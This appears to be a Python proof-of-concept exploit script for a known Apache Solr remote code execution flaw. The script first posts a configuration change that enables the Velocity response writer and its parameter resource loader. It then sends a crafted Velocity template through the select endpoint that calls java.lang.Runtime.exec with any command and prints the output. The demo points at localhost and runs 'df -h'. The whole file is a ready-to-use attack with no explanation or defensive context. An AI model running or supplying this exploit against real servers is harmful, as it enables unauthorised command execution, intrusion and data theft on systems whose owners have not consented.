import requests
from urllib.parse import quote
import time


def enable_params(url):
    headers = {
        "Content-Type": "application/json",
        "Content-Length": "259",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
    }
    data = {
        "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
        }
    }
    params_enable_url = url + "config"
    try:
        req = requests.post(url=params_enable_url, json=data, headers=headers)
        time.sleep(1)
        if req.json()["responseHeader"]["status"] == 0:
            return 0
        else:
            return 1
    except requests.RequestException:
        return 1


def poc(url, cmd):
    if enable_params(url) == 1:
        print('url: %s is false!' % url)
    else:
        start_url = "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) " \
                    "#set($chr=$x.class.forName('java.lang.Character')) " \
                    "#set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('"
        end_str = "')) $ex.waitFor() #set($out=$ex.getInputStream()) " \
                  "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"

        end_url = url + "select?q=1&&wt=velocity&v.template=custom&v.template.custom=" + \
                        quote(start_url + cmd + end_str, 'utf-8')
        new_header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
        }
        cmd_result = requests.get(end_url, headers=new_header)
        print("you command result: \n", cmd_result.text)


if __name__ == '__main__':
    # test 是core admin名称
    base_url = "http://127.0.0.1:8983/solr/test/"
    command = 'df -h'
    poc(base_url, command)
